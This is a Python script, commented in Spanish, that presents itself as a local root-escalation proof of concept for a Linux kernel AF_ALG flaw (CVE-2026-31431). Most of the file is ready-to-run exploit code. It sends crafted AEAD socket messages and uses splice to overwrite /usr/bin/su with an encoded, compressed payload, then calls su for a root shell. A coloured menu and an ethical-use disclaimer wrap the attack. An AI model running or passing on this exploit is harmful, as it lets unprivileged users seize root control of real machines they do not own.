#!/usr/bin/env python3
"""
ROSN-LR5  |  PoC local para CVE-2026-31431
Basado en investigación de copy.fail
"""
import os
import sys
import zlib
import socket
import termios
import tty
import time

# ------------------------------------------------------------
# Colores
# ------------------------------------------------------------
RESET  = "\033[0m"
BOLD   = "\033[1m"
BLINK  = "\033[5m"
WHITE  = "\033[97m"
BLACK  = "\033[30m"
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BLUE   = "\033[94m"
BG_BLACK   = "\033[40m"
BG_RED     = "\033[41m"
BG_GREEN   = "\033[42m"
BG_YELLOW  = "\033[43m"
BG_BLUE    = "\033[44m"

# ------------------------------------------------------------
# Banner principal (nombre resaltado)
# ------------------------------------------------------------
BANNER = f"""
{BOLD}{YELLOW}
+---------------------------------------+
|           ROSN - LR5                  |
|   Kernel AF_ALG Exploit (LPE PoC)     |
+---------------------------------------+
{RESET}{RED}     [ CVE-2026-31431 · Escalada a root ]{RESET}
"""

# ------------------------------------------------------------
# Aviso ético
# ------------------------------------------------------------
DISCLAIMER = f"""
{BG_BLACK}{WHITE}{'─'*63}
 Prueba de concepto para la vulnerabilidad CVE-2026-31431.
 Permite obtener shell root en distribuciones Linux afectadas.

 USO EXCLUSIVO en sistemas propios o bajo autorización
 explícita para auditorías de seguridad.
 El desarrollador no asume responsabilidad por mal uso.

 Investigación original: copy.fail
 Script adaptado:        ROSNLR5
{'─'*63}{RESET}
"""

# ------------------------------------------------------------
# Captura de tecla (soporte básico, sin flechas en esta versión)
# ------------------------------------------------------------
def get_key():
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
    return ch

# ------------------------------------------------------------
# Auditoría rápida de privilegios
# ------------------------------------------------------------
def check_privileges():
    os.system('clear')
    print(f"\n{BOLD}{YELLOW}[+] Análisis de privilegios del sistema{RESET}\n")
    uid = os.getuid()
    username = os.getenv('USER') or os.getenv('LOGNAME') or "desconocido"
    groups = os.getgroups()

    print(f" • Usuario actual : {GREEN}{username}{RESET}  (UID: {uid})")
    if uid == 0:
        print(f" • Estado         : {BG_GREEN}{BLACK} ★ ROOT ★ {RESET}")
    else:
        print(f" • Estado         : {BG_YELLOW}{BLACK} usuario estándar {RESET}")

    try:
        import grp
        group_names = [grp.getgrgid(g).gr_name for g in groups]
        group_str = ', '.join(group_names)
    except:
        group_str = "no disponible"
    print(f" • Grupos         : {group_str}")

    if 'sudo' in group_str or 'wheel' in group_str:
        print(f"\n{BG_BLUE}{WHITE} → El usuario pertenece a un grupo administrativo. {RESET}")
    else:
        print(f"\n{BG_BLACK}{WHITE} → Sin membresía en sudo/wheel. {RESET}")

    input(f"\n{BOLD}Presiona Enter para volver al menú...{RESET}")

# ------------------------------------------------------------
# Núcleo del exploit (sin modificaciones funcionales)
# ------------------------------------------------------------
def run_exploit():
    os.system('clear')
    print(f"\n{BOLD}{RED}[!] Inyectando payload vía AF_ALG...{RESET}\n")
    time.sleep(0.5)

    def d(x): return bytes.fromhex(x)
    def c(fd_su, offset, payload_chunk):
        s = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
        s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        SOL_ALG = 279
        s.setsockopt(SOL_ALG, 1, d('0800010000000010' + '0' * 64))
        s.setsockopt(SOL_ALG, 5, None, 4)
        client, _ = s.accept()
        tam = offset + 4
        fill = d('00')
        client.sendmsg(
            [b"A" * 4 + payload_chunk],
            [(SOL_ALG, 3, fill * 4),
             (SOL_ALG, 2, b'\x10' + fill * 19),
             (SOL_ALG, 4, b'\x08' + fill * 3)],
            32768
        )
        r, w = os.pipe()
        os.splice(fd_su, w, tam, offset_src=0)
        os.splice(r, client.fileno(), tam)
        try:
            client.recv(8 + tam)
        except:
            pass

    try:
        fd_su = os.open("/usr/bin/su", os.O_RDONLY)
        raw = d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3")
        payload = zlib.decompress(raw)
        offset = 0
        while offset < len(payload):
            c(fd_su, offset, payload[offset:offset+4])
            offset += 4

        print(f"{BOLD}{GREEN}[+] Payload inyectado correctamente.{RESET}")
        print(f"{BOLD}{CYAN}[+] Abriendo shell root...{RESET}\n")
        time.sleep(0.8)
        os.system("su")
    except Exception as error:
        print(f"{RED}[-] Error durante la explotación: {error}{RESET}")
        time.sleep(2)

# ------------------------------------------------------------
# Menú principal (navegación por números, siempre fiable)
# ------------------------------------------------------------
def main():
    os.system('clear')
    print(BANNER)
    print(DISCLAIMER)

    print(f"{BOLD}{BLINK}>>> Presiona cualquier tecla para continuar (ESC para salir) <<<{RESET}")
    key = get_key()
    if key == '\x1b':
        print(f"\n{YELLOW}Programa finalizado.{RESET}")
        sys.exit()

    while True:
        os.system('clear')
        print(BANNER)
        print(f"{BOLD}── Menú ──────────────────────────────{RESET}\n")
        print(f" {BG_BLUE}{BLACK} 1 {RESET}  {BLUE}Auditar privilegios del usuario{RESET}")
        print(f" {BG_RED}{BLACK} 2 {RESET}  {RED}Ejecutar exploit ROOT (CVE-2026-31431){RESET}")
        print(f" {BG_GREEN}{BLACK} 3 {RESET}  {GREEN}Salir{RESET}")
        print()

        choice = input(f"{BOLD}Seleccioná una opción > {RESET}").strip()

        if choice == '1':
            check_privileges()
        elif choice == '2':
            run_exploit()
            break
        elif choice == '3':
            print(f"\n{CYAN}Cerrando herramienta...{RESET}")
            break
        else:
            print(f"{RED}Opción no válida. Intenta de nuevo.{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
